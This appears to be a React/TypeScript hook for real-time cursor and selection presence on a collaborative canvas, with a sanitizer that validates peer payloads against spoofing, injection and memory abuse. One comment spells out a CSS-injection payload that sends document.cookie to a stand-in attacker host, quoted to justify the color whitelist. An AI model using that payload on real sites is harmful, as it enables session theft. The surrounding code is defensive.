"use client";

/**
 * Extended presence hook for the canvas tool.
 *
 * Wraps the underlying Supabase channel like {@link usePresence}, but the
 * "self" payload is a `SimplePresence` with optional cursor/viewport/
 * selection/tool fields. The publishing client throttles cursor updates
 * to ~60ms (~16 fps cursor) to stay under Supabase's 10-events/sec budget
 * while still feeling smooth.
 *
 * Returns the live member list AND a `publish()` function the canvas
 * calls on every pointermove / camera change.
 */

import { useCallback, useEffect, useRef, useState } from "react";
import { getSupabaseClient, isRealtimeAvailable } from "@/lib/realtime/supabase-client";
import type { SimplePresence } from "@/lib/realtime/use-presence";
import { usePresenceIdentityOverride } from "@/lib/realtime/presence-identity";
import { useRealtimeAllowed } from "@/lib/realtime/use-realtime-allowed";
import { throttle, type Throttled } from "@/lib/utils/throttle";

const AVATAR_COLORS = [
  "#00f0ff",
  "#a78bfa",
  "#34d399",
  "#f59e0b",
  "#f87171",
  "#60a5fa",
  "#fb923c",
  "#e879f9",
];

/** Bidi-override / isolate codepoints + C0 controls + LRM/RLM/ALM.
 * Block these in names/chat/reactions so a hostile peer can't:
 *   - visually spoof another user's identity by flipping rendered direction
 *   - inject control characters that mangle nameplates / devtools readouts
 *   - flip individual character runs via directional marks
 *
 * Kept in sync with use-presence.ts (R11-fix).
 *
 * R5: built from a string literal with `\u` escapes so the source
 * stays pure ASCII. Raw bidi chars in a regex literal get mangled by
 * git autocrlf / editor save passes. */
const RTL_OVERRIDE_RE = new RegExp(
  "[\\u0000-\\u001F\\u007F\\u061C\\u200E\\u200F\\u202A-\\u202E\\u2066-\\u2069]"
);

/** Whitelist of safe CSS color forms: `#rgb`, `#rrggbb(aa)`,
 * `rgb()`/`rgba()`, `hsl()`/`hsla()`, or a letters-only named-color
 * token. The `color` field flows directly into inline-style
 * properties (border-color, background, color) on cursor-overlay,
 * which doesn't sanitize style values. Without this check, a hostile
 * peer broadcasting `color: "red; background-image: url(https://attacker/?c=" + document.cookie + ")"`
 * would exfiltrate cookies to a third-party domain. Same regex shape
 * as use-presence.ts's COLOR_SAFE_RE. */
const COLOR_SAFE_RE =
  /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;

/**
 * Sanitize an inbound peer payload. Mirrors the validator in
 * use-presence.ts so a hostile peer can't:
 *  - inject a 10 MB selection / 1000-id selection array (DoS by memory),
 *  - send `cursor: "<script>"` and crash consumers that destructure x/y,
 *  - pass NaN/Infinity coords that propagate into worldToScreen,
 *  - spoof another user's identity via RTL-override characters in name,
 *  - broadcast a chatBubble/reaction that never auto-clears.
 *
 * Anything that fails individual-field validation is dropped from the
 * sanitized record rather than rejecting the whole peer — better partial
 * UX than no UX.
 */
const SELECTION_CAP = 100;
const NAME_CAP = 200;
const ID_CAP = 200;
const COLOR_CAP = 64;
function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
  if (!v || typeof v !== "object") return null;
  const r = v as Record<string, unknown>;
  if (
    typeof r.id !== "string" ||
    r.id.length === 0 ||
    r.id.length > ID_CAP ||
    typeof r.name !== "string" ||
    r.name.length === 0 ||
    r.name.length > NAME_CAP ||
    typeof r.color !== "string" ||
    r.color.length === 0 ||
    r.color.length > COLOR_CAP ||
    RTL_OVERRIDE_RE.test(r.name) ||
    RTL_OVERRIDE_RE.test(r.id)
  )
    return null;
  // Run the trimmed color through the CSS whitelist. Anything that
  // isn't a recognised CSS color form falls back to a safe default so
  // the peer still appears in the cursor list — better partial UX
  // than dropping them entirely for a bad style string.
  const safeColor = COLOR_SAFE_RE.test(r.color.trim()) ? r.color.trim() : "#94a3b8";
  const out: SimplePresence = { id: r.id, name: r.name, color: safeColor };
  if (r.cursor && typeof r.cursor === "object") {
    const c = r.cursor as { x?: unknown; y?: unknown };
    if (
      typeof c.x === "number" &&
      Number.isFinite(c.x) &&
      typeof c.y === "number" &&
      Number.isFinite(c.y)
    ) {
      out.cursor = { x: c.x, y: c.y };
    }
  }
  if (r.viewport && typeof r.viewport === "object") {
    const vp = r.viewport as Record<string, unknown>;
    if (
      typeof vp.x === "number" &&
      Number.isFinite(vp.x) &&
      typeof vp.y === "number" &&
      Number.isFinite(vp.y) &&
      typeof vp.zoom === "number" &&
      Number.isFinite(vp.zoom) &&
      typeof vp.w === "number" &&
      Number.isFinite(vp.w) &&
      typeof vp.h === "number" &&
      Number.isFinite(vp.h)
    ) {
      out.viewport = { x: vp.x, y: vp.y, zoom: vp.zoom, w: vp.w, h: vp.h };
    }
  }
  if (Array.isArray(r.selection)) {
    const ids: string[] = [];
    for (const id of r.selection) {
      if (typeof id === "string" && id.length > 0 && id.length < 500) ids.push(id);
      if (ids.length >= SELECTION_CAP) break;
    }
    out.selection = ids;
  }
  if (typeof r.tool === "string" && r.tool.length > 0 && r.tool.length < 50) out.tool = r.tool;
  if (r.chatBubble && typeof r.chatBubble === "object") {
    const cb = r.chatBubble as { text?: unknown; expiresAt?: unknown };
    if (
      typeof cb.text === "string" &&
      cb.text.length > 0 &&
      cb.text.length <= 200 &&
      !RTL_OVERRIDE_RE.test(cb.text) &&
      typeof cb.expiresAt === "number" &&
      Number.isFinite(cb.expiresAt)
    ) {
      const cap = Date.now() + 30_000;
      out.chatBubble = { text: cb.text, expiresAt: Math.min(cb.expiresAt, cap) };
    }
  }
  if (r.reaction && typeof r.reaction === "object") {
    const re = r.reaction as { emoji?: unknown; x?: unknown; y?: unknown; expiresAt?: unknown };
    const emojiStr = typeof re.emoji === "string" ? re.emoji : null;
    if (
      emojiStr &&
      emojiStr.length > 0 &&
      emojiStr.length <= 8 &&
      !RTL_OVERRIDE_RE.test(emojiStr) &&
      typeof re.x === "number" &&
      Number.isFinite(re.x) &&
      typeof re.y === "number" &&
      Number.isFinite(re.y) &&
      typeof re.expiresAt === "number" &&
      Number.isFinite(re.expiresAt)
    ) {
      const cap = Date.now() + 10_000;
      out.reaction = { emoji: emojiStr, x: re.x, y: re.y, expiresAt: Math.min(re.expiresAt, cap) };
    }
  }
  return out;
}

function colorFor(seed: string): string {
  let hash = 0;
  for (let i = 0; i < seed.length; i++) hash = (seed.charCodeAt(i) + hash * 31) | 0;
  // R5: `Math.abs(-2147483648)` stays -2147483648 in JS (no positive 32-bit
  // counterpart) → `negative % len` is negative → `AVATAR_COLORS[neg]` is
  // `undefined` → React renders no color. Use positive-modulo math.
  const len = AVATAR_COLORS.length;
  return AVATAR_COLORS[((hash % len) + len) % len];
}

export interface CanvasPresenceHook {
  members: SimplePresence[];
  publish: (patch: Partial<Omit<SimplePresence, "id">>) => void;
  /** Self identity used in publish — exposed for cursor color rendering. */
  self: { id: string; name: string; color: string };
}

const CURSOR_THROTTLE_MS = 60;

export function useCanvasPresence(
  requestedChannelName: string | null,
  hint?: Partial<SimplePresence>
): CanvasPresenceHook {
  // Same gate as useRoom: public visitors never join a presence channel.
  const channelName = useRealtimeAllowed() ? requestedChannelName : null;
  const [members, setMembers] = useState<SimplePresence[]>([]);
  // Identity precedence: explicit `hint` > tree-scoped PresenceIdentity
  // context > "Anonymous". Symmetric with useRoom so the canvas presence
  // layer and the room layer agree on who this peer is when the caller
  // doesn't pass an explicit name (owner-side AppShell mount path).
  const contextIdentity = usePresenceIdentityOverride();

  // Self identity — stable across renders. crypto.randomUUID falls back to
  // a timestamp-anchored Math.random shim if the global isn't present
  // (older SSR contexts). The previous `Math.random().toString(36).slice(2)`
  // alone could produce extremely short ids (1 char when the random
  // encoding terminated early), which collide across same-second joiners.
  const selfRef = useRef<{ id: string; name: string; color: string } | null>(null);
  if (!selfRef.current) {
    const id =
      hint?.id ??
      contextIdentity?.id ??
      (typeof crypto !== "undefined" && crypto.randomUUID
        ? crypto.randomUUID()
        : `p_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 9).padEnd(7, "0")}`);
    const name = hint?.name ?? contextIdentity?.name ?? "Anonymous";
    const color = hint?.color ?? colorFor(name);
    selfRef.current = { id, name, color };
  }
  const self = selfRef.current;

  const stateRef = useRef<SimplePresence>({ ...self });
  const trackRef = useRef<((p: SimplePresence) => Promise<unknown>) | null>(null);
  const throttledTrackRef = useRef<Throttled<[SimplePresence]> | null>(null);

  useEffect(() => {
    if (!channelName || !isRealtimeAvailable()) return;
    const supabase = getSupabaseClient();
    if (!supabase) return;

    const channel = supabase.channel(channelName, {
      config: { presence: { key: self.id } },
    });

    channel
      .on("presence", { event: "sync" }, () => {
        const state = channel.presenceState<SimplePresence>();
        const list: SimplePresence[] = [];
        for (const key of Object.keys(state)) {
          const metas = state[key];
          const first = Array.isArray(metas) ? metas[0] : undefined;
          // Run every peer record through the same sanitizer the
          // basic usePresence hook uses. Without this, the canvas
          // path skipped validation entirely — a hostile peer could
          // broadcast 1000-id selections, malformed cursors with
          // string x/y, or an RTL-spoofed name and the canvas would
          // render it.
          const clean = sanitizeCanvasPresence(first);
          if (clean) list.push(clean);
        }
        setMembers(list);
      })
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          trackRef.current = (p) => channel.track(p);
          await channel.track(stateRef.current);
        }
      });

    // Throttle outbound track() calls so a 60fps cursor only sends ~16/sec.
    throttledTrackRef.current = throttle((p: SimplePresence) => {
      void trackRef.current?.(p);
    }, CURSOR_THROTTLE_MS);

    return () => {
      throttledTrackRef.current?.cancel();
      throttledTrackRef.current = null;
      trackRef.current = null;
      // R9: chain untrack → unsubscribe → removeChannel. The previous
      // path called .unsubscribe() but NEVER .removeChannel(); the
      // Supabase v2 client retained the channel in its internal
      // channels[] map for the page lifetime. Canvas presence churns
      // hard — every board change / share-link nav leaked a channel
      // plus all its sanitizer + setMembers closures. After a few
      // hours of board-hopping this dominated session memory growth.
      void Promise.resolve(channel.untrack())
        .then(() => channel.unsubscribe())
        .catch(() => {});
      try {
        void getSupabaseClient()?.removeChannel(channel);
      } catch {
        /* client torn down */
      }
      // Drop the old channel's peers so cursors don't linger when the
      // channel goes away without a replacement (e.g. owner sign-out).
      setMembers([]);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [channelName]);

  // R11-fix: memoise `publish` so consumers' deps lists stay stable.
  // The previous bare `const publish = (...) => {...}` recreated the
  // function on every render — every effect listing `publish` in its
  // deps fired on every parent render. Most visibly:
  // whiteboard-canvas.tsx:319 has
  //   useEffect(() => publish({selection, tool}), [selection, tool, publish])
  // which previously ran on every render of the parent canvas (every
  // cursor move, every drag frame), broadcasting selection + tool
  // across the wire even when nothing relevant changed. `useCallback`
  // with an empty dep list is safe because every value publish reads
  // (stateRef, trackRef, throttledTrackRef) is a ref.
  const publish = useCallback((patch: Partial<Omit<SimplePresence, "id">>) => {
    // Cap outbound selection so a user with a marquee over 5000 objects
    // doesn't broadcast a 5000-id array on every selection-change.
    // Peers cap inbound at SELECTION_CAP too, so anything over that
    // would be silently dropped — capping outbound keeps the broadcast
    // budget under control. (The local selection state is unaffected;
    // only what we publish to peers is truncated.)
    if (patch.selection && patch.selection.length > SELECTION_CAP) {
      patch = { ...patch, selection: patch.selection.slice(0, SELECTION_CAP) };
    }
    // R11-fix: evict expired ephemerals from stateRef BEFORE merging
    // the new patch. Previously chatBubble + reaction stayed in
    // stateRef.current forever once set, so every cursor-move broadcast
    // shipped a stale (expired) bubble. Late-joining peers received it
    // and rendered it for up to 30 s. Now expired ephemerals are
    // cleared on the next publish; the channel state stays lean.
    const now = Date.now();
    const next: SimplePresence = { ...stateRef.current };
    if (next.chatBubble && next.chatBubble.expiresAt <= now) {
      delete next.chatBubble;
    }
    if (next.reaction && next.reaction.expiresAt <= now) {
      delete next.reaction;
    }
    stateRef.current = { ...next, ...patch };
    // Bypass throttle ONLY when the patch carries no cursor — selection/
    // tool/viewport changes are infrequent and the user expects them to
    // feel instant. When a cursor IS present (with or without other
    // fields), we throttle so a 60fps move doesn't blow the 10-event/sec
    // Supabase budget. If trackRef hasn't been initialised yet (pre-
    // SUBSCRIBED), drop the publish silently; the next call after
    // subscription completes lands fine.
    if (!trackRef.current) return;
    if (patch.cursor !== undefined) {
      throttledTrackRef.current?.(stateRef.current);
    } else {
      void trackRef.current(stateRef.current);
    }
  }, []);

  return { members, publish, self };
}
